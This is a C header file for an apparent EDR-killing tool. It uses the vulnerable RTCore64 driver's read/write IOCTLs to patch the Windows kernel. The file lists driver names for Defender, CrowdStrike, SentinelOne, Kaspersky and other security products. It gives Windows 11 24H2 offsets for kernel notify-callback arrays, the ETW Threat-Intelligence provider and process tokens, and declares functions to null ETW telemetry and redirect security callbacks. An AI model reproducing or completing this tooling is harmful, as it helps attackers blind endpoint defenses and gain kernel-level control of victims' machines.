#ifndef KERNEL_PATCHING_H
#define KERNEL_PATCHING_H

#include <assert.h> 
#include <stdio.h>
#include <windows.h>

#define IOCTL_RTCORE_READ_MSR    0x80002030   
#define IOCTL_RTCORE_READ_DATA   0x80002048   
#define IOCTL_RTCORE_WRITE_DATA  0x8000204C  
#define DEVICE_NAME L"\\\\.\\RTCore64"
#define IA32_LSTAR_MSR 0xc0000082

static const PWSTR EDR_DRIVERS[] = {
    L"WdFilter.sys",                    // Microsoft Defender
    L"csagent.sys", L"csdevicecontrol.sys",  // CrowdStrike Falcon
    L"sentinelmonitor.sys", L"sentinelone.sys",  // SentinelOne
    L"mfehidk.sys", L"mfehidk.sys",      // Trellix/McAfee
    L"SymEFA.sys", L"SymEvent.sys",      // Symantec
    L"atc.sys",                         // Avast
    L"klif.sys", L"kldisk.sys",          // Kaspersky
    L"eset.sys",                        // ESET
    L"carbonblackk.sys",                // VMware Carbon Black
    L"cyoptics.sys",                     // Cylance
    NULL
};



// --------------------- OFFSETS VERIFIED FOR WINDOWS 11 24H2 ---------------------------
// 
// ═══════════════════════════════════════════════════════════════════════════
// ntoskrnl globals (base 0xfffff803`da400000 at extraction time)
// ═══════════════════════════════════════════════════════════════════════════
#define OFF_PsInitialSystemProcess        0x0FC5AB0
#define OFF_PspCreateProcessNotifyRoutine 0x0F04F60
#define OFF_PspCreateThreadNotifyRoutine  0x0F05360   
#define OFF_PspLoadImageNotifyRoutine     0x0F05160   
#define OFF_PsLoadedModuleList            0x0EF5010
#define OFF_EtwThreatIntProvRegHandle     0x0EFF3C0
#define OFF_RET_GADGET                    0x61123DULL

// ═══════════════════════════════════════════════════════════════════════════
// _EPROCESS 
// ═══════════════════════════════════════════════════════════════════════════
#define OFF_EPROCESS_UniqueProcessId      0x1D0
#define OFF_EPROCESS_ActiveProcessLinks   0x1D8
#define OFF_EPROCESS_Token                0x248

// ═══════════════════════════════════════════════════════════════════════════
// _EX_FAST_REF  (token pointer masking)
// ═══════════════════════════════════════════════════════════════════════════
#define EX_FAST_REF_MASK                  (~0xFULL)

// ═══════════════════════════════════════════════════════════════════════════
// _KLDR_DATA_TABLE_ENTRY
// ═══════════════════════════════════════════════════════════════════════════
#define OFF_KLDR_DllBase                  0x030
#define OFF_KLDR_SizeOfImage              0x040
#define OFF_KLDR_BaseDllName              0x058

// ═══════════════════════════════════════════════════════════════════════════
// _UNICODE_STRING
// ═══════════════════════════════════════════════════════════════════════════
#define OFF_USTR_Length                   0x00
#define OFF_USTR_MaximumLength            0x02
#define OFF_USTR_Buffer                   0x08

// ═══════════════════════════════════════════════════════════════════════════
// _LIST_ENTRY  (ActiveProcessLinks and PsLoadedModuleList traversal)
// ═══════════════════════════════════════════════════════════════════════════
#define OFF_LIST_Flink                    0x00
#define OFF_LIST_Blink                    0x08

// ═══════════════════════════════════════════════════════════════════════════
// _EX_CALLBACK_ROUTINE_BLOCK
// ═══════════════════════════════════════════════════════════════════════════
#define OFF_EXCB_RundownRef               0x00
#define OFF_EXCB_Function                 0x08
#define OFF_EXCB_Context                  0x10

// ═══════════════════════════════════════════════════════════════════════════
// _ETW_REG_ENTRY
// ═══════════════════════════════════════════════════════════════════════════
#define OFF_ETW_GuidEntry                 0x20
#define OFF_ETW_Flags                     0x62
#define OFF_ETW_EnableMask                0x64    // single KWrite32 target
#define OFF_ETW_GroupEnableMask           0x65
#define OFF_ETW_HostEnableMask            0x66
#define OFF_ETW_HostGroupEnableMask       0x67

// ═══════════════════════════════════════════════════════════════════════════
// _ETW_GUID_ENTRY
// ═══════════════════════════════════════════════════════════════════════════
#define OFF_GUIDENTRY_Guid                0x28    // _GUID
#define OFF_GUIDENTRY_HostEntry           0x190   // NULL on this build
#define ETWIT_GUID                        0xf4e1897c // Constant GUID of Microsoft-Windows-Threat-Intelligence 

// ═══════════════════════════════════════════════════════════════════════════
// KASLR leak 
// ═══════════════════════════════════════════════════════════════════════════
#define DELTA_KiSystemCall64              0x6B5140

// ═══════════════════════════════════════════════════════════════════════════
// IOCTL request structs
// ═══════════════════════════════════════════════════════════════════════════
typedef struct _RTCORE_RW_REQ {          // must be exactly 48 bytes
    ULONG   Unused00;                    // +0x00
    ULONG   Unused04;                    // +0x04
    ULONG64 Address;                     // +0x08  (must be non-zero)
    ULONG   Unused10;                    // +0x10
    ULONG   Offset;                      // +0x14  (zero-extended)
    ULONG   Size;                        // +0x18  MUST be 1, 2, or 4
    ULONG   Value;                       // +0x1C  (read result / write source)
    UCHAR   Pad[0x10];                   // +0x20..+0x2F  (total = 0x30 = 48)
} RTCORE_RW_REQ;

typedef struct _RTCORE_MSR_REQ {         // must be exactly 12 bytes
    ULONG   Register;                    // +0x00
    ULONG   High;                        // +0x04  (output: HIDWORD)
    ULONG   Low;                         // +0x08  (output: LODWORD)
} RTCORE_MSR_REQ;
static_assert(sizeof(RTCORE_RW_REQ) == 48, "RTCore RW struct must be 48");
static_assert(sizeof(RTCORE_MSR_REQ) == 12, "RTCore MSR struct must be 12");


// ----------------------- Function Decleration ---------------------------

ULONG64 LeakNtBase(HANDLE DeviceDriver);
BOOL KernelReadMSR(ULONG idx, PULONG64 Output, HANDLE DeviceDriver);
BOOL KernelWrite32(ULONG64 TargetAddr, ULONG val, HANDLE DeviceDriver);
BOOL KernelRead32(ULONG64 TargetAddr, PULONG Output, HANDLE DeviceDriver);
BOOL KernelRead64(ULONG64 TargetAddr, PULONG64 Output, HANDLE DeviceDriver);
BOOL KernelWrite64(ULONG64 TargetAddr, ULONG64 val, HANDLE DeviceDriver);
BOOL EtwTiNulling(HANDLE DeviceDriver, ULONG64 NtBase);
BOOL RedirectCallbackArrays(ULONG64 NtBase, HANDLE DeviceDriver);
BOOL IsInEdrList(PWSTR ModuleName);
BOOL FindFunctionModule(ULONG64 Ntbase, ULONG64 FnAddress, HANDLE DeviceDriver, PWSTR outBuf, SIZE_T outBufChars);
HANDLE LoadDriver();


#endif // !KERNEL_PATCHING_H
